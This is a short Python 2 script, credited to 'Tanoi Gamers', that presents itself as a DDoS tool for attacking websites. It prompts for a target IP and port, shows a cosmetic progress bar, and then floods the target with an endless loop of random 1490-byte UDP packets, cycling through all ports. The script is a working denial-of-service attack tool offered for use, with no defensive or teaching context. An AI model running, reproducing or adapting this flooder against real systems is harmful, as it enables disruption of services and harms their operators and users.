#The Creator By Tanoi Gamers
#Scirpt about DDosAttack Websites
#Youtube is Tanoi Gamers

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOSTN")
print
print "Creator  : Tanoi Gamers"
print "Codename : TN-01"
print "Version  : 0.1"
print "IDgithub : https://github.com/Tanoi-Gamers-673-x"
print
print "Please confirm that you will proceed."
print
quit = raw_input("Y/N : ")
ip = raw_input("IP Target@ : ")
port = input("Port       : ")

os.system("clear")
print
os.system("figlet DDos Starting")
print "\033[1m\033[32m Tanoi Gamers"
print "\033[0m"
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

